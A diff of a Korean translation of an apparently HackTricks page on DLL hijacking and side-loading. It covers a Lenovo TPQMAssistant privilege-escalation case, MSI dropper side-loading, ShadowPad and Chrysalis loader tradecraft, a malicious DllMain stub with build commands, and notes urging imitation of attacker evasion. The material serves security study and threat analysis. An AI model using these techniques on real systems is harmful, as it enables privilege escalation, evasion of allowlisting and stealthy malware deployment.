-- 모든 페이로드 로직은 `DLL_PROCESS_ATTACH`에 들어갈 수 있으며, export는 필요하지 않습니다.
+- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.
 
-## 사례 연구: CVE-2025-1729 - TPQMAssistant.exe를 이용한 권한 상승
+## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe
 
-이 사례는 Lenovo의 TrackPoint Quick Menu (`TPQMAssistant.exe`)에서 **Phantom DLL Hijacking**을 보여주며, **CVE-2025-1729**로 추적됩니다.
+이 사례는 Lenovo의 TrackPoint Quick Menu (`TPQMAssistant.exe`)에서 발생한 Phantom DLL Hijacking을 보여주며, **CVE-2025-1729**로 추적됩니다.
 
-### 취약점 세부사항
+### Vulnerability Details
 
-- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
-- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
-- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
-- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.
+- **Component**: `TPQMAssistant.exe`는 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 위치합니다.
+- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`는 매일 오전 9:30에 로그인된 사용자 컨텍스트에서 실행됩니다.
+- **Directory Permissions**: `CREATOR OWNER`가 쓰기 권한을 가지며, 로컬 사용자가 임의 파일을 배치할 수 있습니다.
+- **DLL Search Behavior**: 작업 디렉터리에서 먼저 `hostfxr.dll`을 로드하려 시도하고 누락되면 "NAME NOT FOUND"를 로그하므로 로컬 디렉터리 검색 우선순위를 나타냅니다.
 
-### Exploit 구현
+### Exploit Implementation
 
-공격자는 동일한 디렉터리에 악성 `hostfxr.dll` 스텁을 배치하여, 누락된 DLL을 악용해 사용자 컨텍스트에서 코드 실행을 달성할 수 있습니다:
+공격자는 동일한 디렉터리에 악성 `hostfxr.dll` 스텁을 배치하여 누락된 DLL을 악용해 사용자 컨텍스트에서 코드 실행을 달성할 수 있습니다:
 ```c
 #include <windows.h>
 
@@ -399,28 +399,28 @@ return TRUE;
 ```
 ### 공격 흐름
 
-1. 표준 사용자로서 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 배치한다.
-2. 현재 사용자 컨텍스트에서 예약된 작업이 오전 9:30에 실행될 때까지 기다린다.
-3. 작업이 실행될 때 관리자가 로그인되어 있으면 악성 DLL이 관리자의 세션에서 medium integrity로 실행된다.
-4. 표준 UAC bypass 기법을 연계하여 medium integrity에서 SYSTEM 권한으로 상승시킨다.
+1. 일반 사용자로서 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 배치합니다.
+2. 현재 사용자 컨텍스트에서 예약된 작업이 오전 9:30에 실행될 때까지 기다립니다.
+3. 작업 실행 시 관리자 계정이 로그인된 상태이면, 악성 DLL이 관리자 세션에서 medium integrity로 실행됩니다.
+4. 표준 UAC bypass 기법을 연결하여 medium integrity에서 SYSTEM 권한으로 상승시킵니다.
 
-## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)
+## 사례 연구: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)
 
-위협 행위자는 신뢰된 서명된 프로세스 하에서 페이로드를 실행하기 위해 MSI-based droppers와 DLL side-loading을 자주 결합한다.
+위협 행위자들은 종종 MSI 기반 드로퍼를 DLL side-loading과 결합하여 신뢰받는 서명된 프로세스 하에서 페이로드를 실행합니다.
 
-Chain overview
-- 사용자가 MSI를 다운로드한다. GUI 설치 중에 CustomAction이 조용히 실행되어(예: LaunchApplication 또는 VBScript 액션) 임베디드 리소스에서 다음 단계를 재구성한다.
-- dropper가 합법적으로 서명된 EXE와 악성 DLL을 동일한 디렉터리에 쓴다(예: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
-- 서명된 EXE가 시작되면 Windows DLL search order가 먼저 작업 디렉터리에서 wsc.dll을 로드하여 서명된 부모 프로세스 하에서 공격자 코드를 실행한다(ATT&CK T1574.001).
+체인 개요
+- 사용자가 MSI를 다운로드합니다. GUI 설치 도중 CustomAction이 백그라운드에서 조용히 실행되며(예: LaunchApplication 또는 VBScript action), 내장 리소스에서 다음 단계를 재구성합니다.
+- 드로퍼는 정당한 서명된 EXE와 악성 DLL을 동일한 디렉터리에 씁니다 (예: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
+- 서명된 EXE가 시작되면, Windows의 DLL 검색 순서에 따라 작업 디렉터리에서 먼저 wsc.dll을 로드하여 서명된 상위 프로세스 하에서 공격자 코드를 실행합니다 (ATT&CK T1574.001).
 
-MSI analysis (what to look for)
+MSI 분석 (확인할 항목)
 - CustomAction 테이블:
-- 실행 파일이나 VBScript를 실행하는 항목을 찾는다. 예시 의심 패턴: 백그라운드에서 임베디드 파일을 실행하는 LaunchApplication.
-- Orca (Microsoft Orca.exe)에서 CustomAction, InstallExecuteSequence 및 Binary 테이블을 검사한다.
-- MSI CAB 안의 임베디드/분할 페이로드:
+- 실행 파일이나 VBScript를 실행하는 항목을 찾아보세요. 예시 의심 패턴: LaunchApplication이 백그라운드에서 임베디드 파일을 실행함.
+- Orca(Microsoft Orca.exe)에서 CustomAction, InstallExecuteSequence 및 Binary 테이블을 검사하세요.
+- MSI CAB에 임베디드/분할된 페이로드:
 - 관리자 추출: msiexec /a package.msi /qb TARGETDIR=C:\out
 - 또는 lessmsi 사용: lessmsi x package.msi C:\out
-- VBScript CustomAction에 의해 연결되고 복호화되는 여러 작은 조각들을 찾는다. 일반적인 흐름:
+- VBScript CustomAction에 의해 연결되고 복호화되는 여러 작은 조각을 찾아보세요. 일반적인 흐름:
 ```vb
 ' VBScript CustomAction (high level)
 ' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
@@ -428,11 +428,11 @@ MSI analysis (what to look for)
 ' 3) Decrypt using a hardcoded password/key
 ' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
 ```
-실전 sideloading with wsc_proxy.exe
+wsc_proxy.exe를 이용한 실전 sideloading
 - 다음 두 파일을 같은 폴더에 넣으세요:
-- wsc_proxy.exe: 정상적으로 서명된 호스트 (Avast). 프로세스는 해당 디렉터리에서 이름으로 wsc.dll을 로드하려고 시도합니다.
-- wsc.dll: 공격자 DLL. 특정 exports가 필요하지 않다면 DllMain으로 충분합니다; 그렇지 않으면 proxy DLL을 만들고 필요한 exports를 정품 라이브러리로 포워딩하면서 DllMain에서 페이로드를 실행하세요.
-- 최소한의 DLL 페이로드를 빌드하세요:
+- wsc_proxy.exe: 합법적으로 서명된 호스트(Avast). 이 프로세스는 자신의 디렉터리에서 이름으로 wsc.dll을 로드하려고 시도합니다.
+- wsc.dll: attacker DLL. 특정 exports가 필요 없다면 DllMain으로 충분합니다; 그렇지 않으면 proxy DLL을 빌드하고 DllMain에서 payload를 실행하는 동안 필요한 exports를 원본 라이브러리로 포워딩하세요.
+- 최소한의 DLL payload를 빌드하세요:
 ```c
 // x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
 #include <windows.h>
@@ -443,26 +443,52 @@ WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
 return TRUE;
 }
 ```
-- Export 요구사항이 있을 경우, 프록시 프레임워크(예: DLLirant/Spartacus)를 사용해 페이로드도 실행하는 포워딩 DLL을 생성하세요.
+- 내보내기 요구사항의 경우, 프록시 프레임워크(예: DLLirant/Spartacus)를 사용하여 페이로드도 실행하는 포워딩 DLL을 생성하라.
 
-- 이 기법은 호스트 바이너리에 의한 DLL 이름 해석에 의존합니다. 호스트가 절대 경로를 사용하거나 안전 로딩 플래그(예: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)를 사용하면 hijack이 실패할 수 있습니다.
-- KnownDLLs, SxS, and forwarded exports는 우선순위에 영향을 미치므로 호스트 바이너리와 export 집합을 선택할 때 반드시 고려해야 합니다.
+- 이 기술은 호스트 바이너리의 DLL 이름 해석에 의존한다. 호스트가 절대 경로를 사용하거나 안전한 로드 플래그(예: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)를 사용하면 하이재킹이 실패할 수 있다.
+- KnownDLLs, SxS, 및 forwarded exports는 우선순위에 영향을 줄 수 있으므로 호스트 바이너리와 export 집합을 선택할 때 고려해야 한다.
 
-## Signed triads + encrypted payloads (ShadowPad case study)
+## 서명된 3파일 트라이어드 + 암호화된 페이로드 (ShadowPad 사례 연구)
 
-Check Point는 Ink Dragon이 핵심 페이로드를 디스크에 암호화 상태로 유지하면서 정식 소프트웨어에 섞어 배포하기 위해 **three-file triad**를 어떻게 사용하는지 설명했습니다:
+Check Point는 Ink Dragon이 ShadowPad를 디스크에 핵심 페이로드를 암호화한 채로 정식 소프트웨어처럼 위장하기 위해 **세 파일 트라이어드**를 사용하는 방법을 설명했다:
 
-1. **Signed host EXE** – AMD, Realtek, NVIDIA 같은 벤더(예: `vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`)의 바이너리가 악용됩니다. 공격자는 실행파일 이름을 Windows 바이너리처럼 보이게 바꾸기도 합니다(예: `conhost.exe`)—하지만 Authenticode 서명은 그대로 유효합니다.
-2. **Malicious loader DLL** – EXE 옆에 예측 가능한 이름으로 드롭됩니다(예: `vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). 이 DLL은 보통 ScatterBrain 프레임워크로 난독화된 MFC 바이너리이며, 암호화된 블랍을 찾아 복호화하고 ShadowPad를 reflectively map하는 역할만 수행합니다.
-3. **Encrypted payload blob** – 종종 동일 디렉터리에 `<name>.tmp`로 저장됩니다. 로더가 복호화된 페이로드를 메모리 맵한 후 TMP 파일을 삭제해 포렌식 흔적을 제거합니다.
+1. **서명된 호스트 EXE** – AMD, Realtek, 또는 NVIDIA 같은 벤더가 악용된다 (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). 공격자는 실행파일의 이름을 Windows 바이너리처럼 위장(예: `conhost.exe`)하지만 Authenticode 서명은 유효하게 남아 있다.
+2. **악성 로더 DLL** – EXE 옆에 예상 이름으로 드롭된다 (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). 이 DLL은 대개 ScatterBrain 프레임워크로 난독화된 MFC 바이너리이며, 유일한 임무는 암호화된 블롭을 찾아 복호화하고 reflectively map ShadowPad이다.
+3. **암호화된 페이로드 블롭** – 종종 같은 디렉터리에 `<name>.tmp`로 저장된다. 복호화된 페이로드를 메모리 매핑한 후 로더는 포렌식 증거를 없애기 위해 TMP 파일을 삭제한다.
 
-Tradecraft notes:
+전술 노트:
 
-* 서명된 EXE의 이름을 바꾸되 PE 헤더의 `OriginalFileName`은 유지하면, 벤더 서명을 유지하면서 Windows 바이너리처럼 가장할 수 있습니다. Ink Dragon이 실제로는 AMD/NVIDIA 유틸리티인 `conhost.exe`처럼 보이는 바이너리를 드롭한 습관을 모방하세요.
-* 실행파일이 신뢰된 상태로 남아 있기 때문에, 대부분의 allowlisting 제어는 악성 DLL이 단지 그 옆에 존재하기만 하면 충분합니다. 로더 DLL 커스터마이징에 집중하세요; 서명된 부모(EXE)는 보통 그대로 실행할 수 있습니다.
-* ShadowPad의 decryptor는 TMP 블랍이 로더 옆에 위치하고 쓰기 가능한 상태이길 기대하며, 매핑 후 파일을 0으로 덮어써 삭제합니다. 페이로드가 로드될 때까지 디렉터리를 쓰기 가능 상태로 유지하세요; 메모리에 적재된 이후에는 TMP 파일을 OPSEC을 위해 안전하게 삭제할 수 있습니다.
+* 서명된 EXE의 이름을 바꾸되 PE 헤더의 원래 `OriginalFileName`을 유지하면 Windows 바이너리로 위장하면서 벤더 서명을 유지할 수 있다. 따라서 실제로는 AMD/NVIDIA 유틸리티인 `conhost.exe`처럼 보이는 바이너리를 드롭하는 Ink Dragon의 습관을 재현하라.
+* 실행파일이 신뢰된 상태로 유지되므로 대부분의 allowlisting 제어는 악성 DLL이 그 옆에 놓이는 것만으로 충분하다. 로더 DLL 커스터마이징에 집중하라; 서명된 상위 실행파일은 보통 변경하지 않고 실행할 수 있다.
+* ShadowPad의 복호화기는 TMP 블롭이 로더 옆에 존재하고 쓰기 가능하기를 기대하며, 매핑 후 파일을 제로화한다. 페이로드가 로드될 때까지 디렉터리를 쓰기 가능 상태로 유지하라; 메모리에 올라간 후에는 TMP 파일을 OPSEC을 위해 안전하게 삭제할 수 있다.
 
-## References
+## 사례 연구: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)
+
+최근 Lotus Blossom 침해에서는 신뢰된 업데이트 체인을 악용해 NSIS로 패킹된 dropper를 배포했고, 이는 DLL sideload와 완전히 메모리 내 페이로드를 스테이징했다.
+
+트레이드크래프트 흐름
+- `update.exe` (NSIS)는 `%AppData%\Bluetooth`를 생성하고 **HIDDEN**으로 표시한 뒤, 이름이 바뀐 Bitdefender Submission Wizard `BluetoothService.exe`, 악성 `log.dll`, 그리고 암호화된 블롭 `BluetoothService`를 드롭하고 EXE를 실행한다.
+- 호스트 EXE는 `log.dll`을 임포트하고 `LogInit`/`LogWrite`를 호출한다. `LogInit`은 블롭을 mmap으로 로드한다; `LogWrite`는 맞춤형 LCG 기반 스트림(상수 **0x19660D** / **0x3C6EF35F**, 키 재료는 이전 해시에서 파생)을 사용해 복호화하고 버퍼를 평문 셸코드로 덮어쓴 뒤 임시를 해제하고 그곳으로 점프한다.
+- IAT를 회피하기 위해 로더는 export 이름을 해싱(기준 **FNV-1a basis 0x811C9DC5 + prime 0x1000193**)한 다음 Murmur 스타일의 avalanche(**0x85EBCA6B**)를 적용하고 솔트된 대상 해시와 비교해 API를 해결한다.
+
+주요 셸코드 (Chrysalis)
+- PE 유사 메인 모듈을 키 `gQ2JR&9;`로 다섯 번의 패스에 걸쳐 add/XOR/sub를 반복해 복호화한 뒤 동적으로 `Kernel32.dll`을 로드하고 `GetProcAddress`로 임포트 해결을 완료한다.
+- 런타임에 문자별 bit-rotate/XOR 변환으로 DLL 이름 문자열을 재구성한 다음 `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`를 로드한다.
+- 두 번째 리졸버를 사용해 **PEB → InMemoryOrderModuleList**를 순회하고 각 export 테이블을 4바이트 블록으로 Murmur 스타일 믹싱으로 파싱하며, 해시를 찾지 못하면 `GetProcAddress`로만 폴백한다.
+
+내장 구성 및 C2
+- 구성은 드롭된 `BluetoothService` 파일의 **offset 0x30808**(크기 **0x980**)에 위치하며 키 `qwhvb^435h&*7`로 RC4 복호화되어 C2 URL과 User-Agent를 드러낸다.
+- 비콘은 점으로 구분된 호스트 프로필을 만들고 태그 `4Q`를 선행시킨 뒤 HTTPS로 `HttpSendRequestA`를 호출하기 전에 키 `vAuig34%^325hGV`로 RC4 암호화한다. 응답은 RC4 복호화되어 태그 스위치로 분기된다 (`4T` 쉘, `4V` 프로세스 실행, `4W/4X` 파일 쓰기, `4Y` 읽기/유출, `4\\` 제거, `4` 드라이브/파일 열거 + 청크 전송 등).
+- 실행 모드는 CLI 인수로 조절된다: 인수가 없으면 설치(persistence: 서비스/Run 키)를 수행하고 `-i`를 가리킨다; `-i`는 자신을 `-k`로 재실행하며; `-k`는 설치를 건너뛰고 페이로드를 실행한다.
+
+관찰된 대체 로더
+- 동일한 침입은 Tiny C Compiler를 드롭하고 `C:\ProgramData\USOShared\`에서 `svchost.exe -nostdlib -run conf.c`를 실행했으며, 옆에 `libtcc.dll`이 있었다. 공격자가 제공한 C 소스는 셸코드를 임베드하여 컴파일되고 PE를 디스크에 쓰지 않고 메모리에서 실행되었다. 다음으로 재현하라:
+```cmd
+C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
+```
+- 이 TCC 기반의 compile-and-run 단계는 런타임에 `Wininet.dll`을 import했고 하드코딩된 URL에서 second-stage shellcode를 가져와 컴파일러 실행으로 가장하는 유연한 loader를 제공했다.
+
+## 참고자료
 
 - [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
 - [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
@@ -474,6 +500,7 @@ Tradecraft notes:
 - [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
 - [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
 - [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
+- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
 
 
 {{#include ../../../banners/hacktricks-training.md}}
